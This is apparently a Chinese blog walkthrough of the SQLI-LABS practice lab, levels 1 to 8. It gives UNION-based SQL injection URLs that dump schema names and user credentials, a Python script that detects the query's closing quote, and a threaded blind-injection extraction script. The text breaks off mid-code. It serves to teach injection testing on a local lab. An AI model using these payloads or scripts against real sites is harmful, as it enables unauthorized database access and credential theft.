<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQLI-LABS | 虚幻无实</title><meta name="author" content="虚幻无实"><meta name="copyright" content="虚幻无实"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQLI-LABS靶场[TOC] 项目一(Advanced Injections)sql基础知识：查库：	 select schema_name from information_schema.schemata;  查表: 	 select table_name from information_schema.tables where table_schema&#x3D;’security’;">
<meta property="og:type" content="article">
<meta property="og:title" content="SQLI-LABS">
<meta property="og:url" content="http://example.com/2022/07/22/SQLI-LABS%E9%9D%B6%E5%9C%BA/index.html">
<meta property="og:site_name" content="虚幻无实">
<meta property="og:description" content="SQLI-LABS靶场[TOC] 项目一(Advanced Injections)sql基础知识：查库：	 select schema_name from information_schema.schemata;  查表: 	 select table_name from information_schema.tables where table_schema&#x3D;’security’;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img1.baidu.com/it/u=2617250461,42164744&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=300">
<meta property="article:published_time" content="2022-07-22T10:47:57.206Z">
<meta property="article:modified_time" content="2022-08-10T01:21:42.418Z">
<meta property="article:author" content="虚幻无实">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img1.baidu.com/it/u=2617250461,42164744&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=300"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/07/22/SQLI-LABS%E9%9D%B6%E5%9C%BA/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQLI-LABS',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-08-10 09:21:42'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202207212023398.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> CTF</span></a></div><div class="menus_item"><a class="site-page" href="/code/"><i class="fa-fw fas fa-tags"></i><span> 代码编程</span></a></div><div class="menus_item"><a class="site-page" href="/permeate/"><i class="fa-fw fas fa-tags"></i><span> 渗透测试</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img1.baidu.com/it/u=2617250461,42164744&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=300')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">虚幻无实</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> CTF</span></a></div><div class="menus_item"><a class="site-page" href="/code/"><i class="fa-fw fas fa-tags"></i><span> 代码编程</span></a></div><div class="menus_item"><a class="site-page" href="/permeate/"><i class="fa-fw fas fa-tags"></i><span> 渗透测试</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-music"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQLI-LABS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-22T10:47:57.206Z" title="发表于 2022-07-22 18:47:57">2022-07-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-08-10T01:21:42.418Z" title="更新于 2022-08-10 09:21:42">2022-08-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQLI-LABS"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQLI-LABS靶场"><a href="#SQLI-LABS靶场" class="headerlink" title="SQLI-LABS靶场"></a>SQLI-LABS靶场</h1><p>[TOC]</p>
<h2 id="项目一-Advanced-Injections"><a href="#项目一-Advanced-Injections" class="headerlink" title="项目一(Advanced Injections)"></a>项目一(Advanced Injections)</h2><h3 id="sql基础知识："><a href="#sql基础知识：" class="headerlink" title="sql基础知识："></a>sql基础知识：</h3><p>查库：	 select schema_name from information_schema.schemata; </p>
<p>查表: 	 select table_name from information_schema.tables where table_schema&#x3D;’security’; </p>
<p>查列:    select column_name from information_schema.columns where table_name&#x3D;’users’; </p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘users’–+</p>
<p>查字段:  select username,password from security.users;</p>
<p>‘ union select (substr(select table_name from information_schema.tables where </p>
<p>‘ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()) #  </p>
<p>1’  union select (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() ),2 #</p>
<p><strong>头部注入</strong></p>
<p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。<br>X-Forwarded-For:简称XFF头，它代表客户端，用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中。<br>Cookie，有时也用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）。<br>X-Real-IP一般只记录真实发出请求的客户端IP。<br>Accept Language请求头允许客户端声明它可以理解的自然语言，以及优先选择的区域方言。<br> User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。<br>Accept代表客户端希望接受的数据类型，数据类型中的先后次序表示客户端接受的先后次序。<br>Referer表示一个来源，当浏览器向web服务器发送请求的时候，一般会带上Referer,告诉服务器我是从那个页面链接过来的，服务器借此可以获得一些信息用于处理。Referer用于所有类型的请求。</p>
<h4 id="Less-1："><a href="#Less-1：" class="headerlink" title="Less-1："></a>Less-1：</h4><p>进入第一关后从网页中可以看到直接给出了ID参数</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205231413739.png" alt="1"></p>
<p><strong>注入：</strong><a target="_blank" rel="noopener" href="http://10.34.101.127/sqli-labs-master/Less-1/?id=1">http://10.34.101.127/sqli-labs-master/Less-1/?id=1</a>  *&#x2F;&#x2F;*可直接得到id&#x3D;1的参数</p>
<p><strong>测字段数：</strong><a target="_blank" rel="noopener" href="http://10.34.101.127/sqli-labs-master/Less-1/?id=1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=1&#39;</a> order by 3 –+ &#x2F;&#x2F;返回无异常，字段数为3</p>
<p><strong>显位：</strong><a target="_blank" rel="noopener" href="http://10.34.101.127/sqli-labs-master/Less-1/?id=1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=1&#39;</a> and 1&#x3D;2 union select 1,datebase(),version()–+ </p>
<p><strong>&#x2F;&#x2F;返回</strong>  Your Login name:security，Your Password:5.7.26.也就是当前数据库名为security，当前的mysql版本为5.7.26</p>
<p>**表名:**<a target="_blank" rel="noopener" href="http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()) –+    返回表名:emails,referers,uagents,users</p>
<p><strong>解释：</strong>group_concat() 把多个表名堆在一个格子里面返回</p>
<p>字段名：<a target="_blank" rel="noopener" href="http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,1,(select group_concat(column_name) from information_schema.columns where table_name &#x3D;’users’)–+</p>
<p><strong>显示</strong>YourPassword:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</p>
<p><strong>账号和密码：</strong> <a target="_blank" rel="noopener" href="http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;">http://10.34.101.127/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205231413159.png" alt="3"></p>
<h4 id="Less-2："><a href="#Less-2：" class="headerlink" title="Less-2："></a>Less-2：</h4><h5 id="初步测试："><a href="#初步测试：" class="headerlink" title="初步测试："></a><strong>初步测试：</strong></h5><p>开始第二关，首先直接id&#x3D;1，有结果</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205212255563.png" alt="image-20220521225527507"></p>
<p>加个单引号试试，报错了，说明是数值型注入</p>
<p><strong>判断字段：</strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=1">http://127.0.0.1/sqli-labs-master/Less-2/?id=1</a> order by 3–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205292301070.png" alt="image-20220529230139022"></p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205212258346.png" alt="image-20220521225839316"></p>
<p>注意LIMIT前面的符号，这里我第一个输入的id&#x3D;1” 第二个我输入的是 id&#x3D;1’ 有没有发现啥，我自己输入的东西报错了说明就是数值型注入还有一种方法就是 输入 id&#x3D;1 and 1&#x3D;1 没报错 输入 id&#x3D;1 and 1&#x3D;2报错的话 就是数值型植入，看你们自己的习惯吧</p>
<p><strong>爆破出数据库</strong>：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,database(),version() –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205212335232.png" alt="image-20220521233522182"></p>
<p><strong>爆出表名</strong>：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a> union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database())–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205221301904.png" alt="image-20220522130131776"></p>
<p><strong>账号和密码</strong>：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-2/?id=-1">http://127.0.0.1/sqli-labs-master/Less-2/?id=-1</a>  union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205292214212.png" alt="image-20220529221429158"></p>
<h4 id="Less-3："><a href="#Less-3：" class="headerlink" title="Less-3："></a>Less-3：</h4><p>注入：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;</a>)</p>
<p>判断依据：在id值后面输入1\回显<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301039624.png" alt="image-20220530103918543"></p>
<p>由此可见闭合是’)</p>
<p><strong>测字段名</strong>：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=1&#39;</a>) order by 3–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301043335.png" alt="image-20220530104335284"></p>
<p>**爆破出数据库与版本:**<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,version(),group_concat(schema_name) from information_schema.schemata–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301241341.png" alt="image-20220530124112290"></p>
<p>爆出表名:<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301249163.png" alt="image-20220530124913117"></p>
<p><strong>爆出字段名：</strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301314768.png" alt="image-20220530131411721"></p>
<p><strong>账号和密码：</strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;">http://127.0.0.1/sqli-labs-master/Less-3/?id=-1&#39;</a>)  union select 1,(select group_concat(username) from users),(select group_concat(password) from users)–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301358779.png" alt="image-20220530135831729"></p>
<h4 id="Less-4："><a href="#Less-4：" class="headerlink" title="Less-4："></a>Less-4：</h4><p><strong>注入点：</strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;</a>) </p>
<p>判断依据：1\后面的值为&quot;)所以闭合为”)</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301400768.png" alt="image-20220530140059733"></p>
<p><strong>字段数：</strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=1&quot;</a>) order by 3 –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301402365.png" alt="image-20220530140209335"></p>
<p><strong>数据库名与版本</strong>：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,(select group_concat(schema_name) from information_schema.schemata),version()–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301405035.png" alt="image-20220530140552988"></p>
<p><strong>表名</strong>：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database())–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301423690.png" alt="image-20220530142312645"></p>
<p><strong>字段名</strong>：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D;’users’–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301451817.png" alt="image-20220530145141777"></p>
<p>账号和密码：<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;">http://127.0.0.1/sqli-labs-master/Less-4/?id=-1&quot;</a>) union select 1,(select group_concat(password) from users),(select group_concat(username) from users)–+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205301452061.png" alt="image-20220530145255013"></p>
<h4 id="Less-5-8："><a href="#Less-5-8：" class="headerlink" title="Less-5-8："></a>Less-5-8：</h4><p><strong>注入点：</strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;</a></p>
<p>判断依据：<img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302302423.png" alt="image-20220530230236390"></p>
<p>这里很明显是’闭合</p>
<h5 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-6</strong></h5><p>先用python判断闭合，我这里写了一个比较简单的闭合检测。只能识别简单的闭合，时间注入还检测不了  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;http://127.0.0.1/sqli-labs-master/Less-6&quot;</span><br><span class="line">q = Queue()</span><br><span class="line">t = []</span><br><span class="line"></span><br><span class="line">a = open(&#x27;E://dictionary.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line">for line in a.read().split():</span><br><span class="line">    t.append(line)</span><br><span class="line">for i in t:</span><br><span class="line">    b = url+&#x27;/?id=1&#x27;+str(i)+&#x27;and 1=1 --+&#x27;</span><br><span class="line">    c = url+&#x27;/?id=1&#x27;+str(i)+&#x27;and 1=2 --+&#x27;</span><br><span class="line">    b = requests.get(b)</span><br><span class="line">    c = requests.get(c)</span><br><span class="line">    if b.text != c.text:</span><br><span class="line">         if &#x27;SQL&#x27; not in b.text or &#x27;SQL&#x27; not in c.text:</span><br><span class="line">              print(f&quot;闭合符为&#123;i&#125;&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206011827137.png" alt="image-20220601182731087"></p>
<p>一开始我还很奇怪，为什么有两个闭合符，但实验了一次，发现都能用，应该是把’ 作为输入的参数识别了，然后”闭合了。</p>
<h5 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h5><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021254325.png" alt="image-20220602125434241"></p>
<p>闭合符为’))</p>
<h5 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h5><p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202206021255245.png" alt="image-20220602125519198"></p>
<p>闭合符为’</p>
<p><strong>其他的都一样，我这里以Less-5为例子</strong>，就不一一列举了</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302306465.png" alt="image-20220530230651421"></p>
<p>and 1&#x3D;1回显you are in ….  而and 1&#x3D;2却没有回显，所以应该是盲注</p>
<p><strong>测字段数：</strong><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;">http://127.0.0.1/sqli-labs-master/Less-5/?id=1&#39;</a> order by 3 –+</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205311754054.png" alt="image-20220531175437974"></p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302309477.png" alt="image-20220530230916436"></p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302309590.png" alt="image-20220530230931548"></p>
<p>盲注的话，比较麻烦，可以用substr函数一个一个试</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302314054.png" alt="image-20220530231424027"></p>
<p>这里的是试验成功了，成功返回了you are in..。一个一个试太麻烦了，直接burp suite跑快点，这里成功显示了数据库名为：security</p>
<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205302301280.png" alt="image-20220530230122245"></p>
<p>另一个解法：python写exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> Queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    q = Queue()</span><br><span class="line">    t1 = threading.Thread(target=get_payload,args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t2 = threading.Thread(target=controller,args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">91</span>,<span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">&quot;&#x27; and substr(database(),%d,1)=&#x27;%c&#x27;--+ &quot;</span>  %(i,j)</span><br><span class="line">            dic = &#123;<span class="string">&quot;search&quot;</span>:<span class="built_in">chr</span>(j),<span class="string">&quot;payload&quot;</span>:payload&#125;</span><br><span class="line">            q.put(dic)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">controller</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        send_data(q.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">dic</span>):</span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-5/?id=1&quot;</span>+dic[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">    rest = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> rest.text:</span><br><span class="line">        <span class="built_in">print</span>(dic[<span class="string">&quot;search&quot;</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><img src="https://123-1302906556.cos.ap-nanjing.myqcloud.com/202205311756271.png" alt="image-20220531175643219"></p>
<p><strong>数据库版本</strong>：</p>
<p>5.7.2.6</p>
<p>python，exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import 